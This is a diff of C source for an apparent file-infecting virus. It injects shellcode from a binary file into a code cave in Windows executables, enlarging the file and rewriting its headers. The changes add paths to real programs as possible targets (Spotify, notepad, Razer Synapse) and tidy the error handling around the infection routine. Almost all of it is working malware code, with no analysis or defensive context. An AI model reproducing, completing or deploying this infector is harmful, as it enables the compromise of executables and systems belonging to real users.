@@ -13,7 +13,14 @@
 
 // Binary file.
 #define SHELLCODE_PATH "C:\\Users\\User\\source\\repos\\virus\\shellcode\\shellcode.bin"
-#define INFECTED_PATH "C:\\Users\\User\\source\\repos\\playground\\msgBox.exe"
+#define SPOTIFY_PATH "C:\\Users\\User\\AppData\\Roaming\\Spotify\\Spotify.exe"
+#define NOTEPAD_PATH "C:\\Windows\\SysWOW64\\notepad.exe"
+#define RAZER_PATH "C:\\Program Files (x86)\\Razer\\Synapse3\\WPFUI\\Framework\\Razer Synapse 3 Host\\Razer Synapse 3.exe"
+// path to my own program that pops up message box.
+#define MSGBOX_PATH "C:\\Users\\User\\source\\repos\\virus\\programs_to_infect\\msgBox.exe"
+#define MSGBOX_CPY_PATH "C:\\Users\\User\\source\\repos\\virus\\programs_to_infect\\copies\\msgBox.exe"
+
+#define INFECTED_PATH MSGBOX_PATH
 
 PVOID get_code_cave_address_in_section(EXE_file* infected, PIMAGE_SECTION_HEADER section, PDWORD result_out, DWORD shellcode_size)
 {
@@ -66,7 +73,6 @@ PVOID get_code_cave_address(EXE_file* infected, PDWORD result_out, DWORD shellco
 
 DWORD add_file_empty_place(PCHAR file_name, DWORD size_of_appned, DWORD* result_out)
 {
-    printf("add empty place to %s\n", file_name);
     // Return the origianl file size.
     PVOID zero_buffer = calloc(size_of_appned, 1);
     int result = 0;
@@ -76,7 +82,14 @@ DWORD add_file_empty_place(PCHAR file_name, DWORD size_of_appned, DWORD* result_
         NULL,                     // no security
         OPEN_EXISTING,              // open or create
         FILE_ATTRIBUTE_NORMAL,    // normal file
-        NULL);                    // no attr. template
+        NULL);                   // no attr. template
+
+    if (file_handle == INVALID_HANDLE_VALUE)
+    {
+        *result_out = ERROR;
+        return 0;
+    }
+
 
     DWORD original_code_size = GetFileSize(file_handle, NULL);
     printf("old file size is %d\n",original_code_size);
@@ -88,6 +101,7 @@ DWORD add_file_empty_place(PCHAR file_name, DWORD size_of_appned, DWORD* result_
         return 0;
     }
 
+    printf("add empty place to %s\n", file_name);
     result = WriteFile(file_handle, zero_buffer, size_of_appned, NULL, NULL);
     if (result == 0)
     {
@@ -95,7 +109,6 @@ DWORD add_file_empty_place(PCHAR file_name, DWORD size_of_appned, DWORD* result_
         *result_out = ERROR;
         return 0;
     }
-
     printf("new file size is %d\n", GetFileSize(file_handle, NULL));
 
     CloseHandle(file_handle);
@@ -125,7 +138,7 @@ VOID update_infected_headers(EXE_file* infected, DWORD shellcode_size, PVOID cod
 int main()
 {
     // Restarting the infected file to original.
-    CopyFileA("C:\\Users\\User\\source\\repos\\playground\\Debug\\msgBox.exe", INFECTED_PATH, FALSE);
+    CopyFileA(MSGBOX_CPY_PATH, MSGBOX_PATH, FALSE);
 
     int result = SUCCESS;
     EXE_file* infected = NULL;
@@ -147,6 +160,7 @@ int main()
         result = ERROR;
         goto end;
     }
+    infected->handle = NULL;
 
     shellcode_buffer = malloc(shellcode_size);
     if (shellcode_buffer == NULL)
@@ -162,18 +176,18 @@ int main()
 
     infected->origianal_file_size = add_file_empty_place(INFECTED_PATH, shellcode_size, &result);
     if (result != SUCCESS)
+    {
         goto end;
+    }
 
 
-    // Open the existing file, or if the file does not exist,
-    // create a new file.
-    infected->handle = CreateFileA(INFECTED_PATH, // open Two.txt
-        FILE_APPEND_DATA | GENERIC_READ | GENERIC_WRITE,         // open for writing
-        FILE_SHARE_READ,          // allow multiple readers
-        NULL,                     // no security
-        OPEN_ALWAYS,              // open or create
-        FILE_ATTRIBUTE_NORMAL,    // normal file
-        NULL);                    // no attr. template
+    infected->handle = CreateFileA(INFECTED_PATH, 
+        FILE_APPEND_DATA | GENERIC_READ | GENERIC_WRITE,
+        FILE_SHARE_READ,          
+        NULL,                    
+        OPEN_ALWAYS,             
+        FILE_ATTRIBUTE_NORMAL,   
+        NULL);                  
 
     if (infected->handle == INVALID_HANDLE_VALUE)
     {
@@ -182,7 +196,6 @@ int main()
         goto end;
     }
     infected->file_size = GetFileSize(infected->handle, NULL);
-    printf("new open file size is %d\n", infected->file_size);
     /*
     * Load the file to the ram.
     * Every change in the ram would cause change on the disk eather.
@@ -210,13 +223,16 @@ int main()
 end:
     if (infected != NULL)
     {
-        CloseHandle(infected->handle);
+        if (infected->handle != NULL)
+            CloseHandle(infected->handle);
         free(infected);
     }
     if (shellcode_buffer != NULL)
         free(shellcode_buffer);
 
-    //system(INFECTED_PATH);
+    if (result == ERROR)
+        result = GetLastError();
     // run the infected.
+    //system(INFECTED_PATH);
     return result;
 }
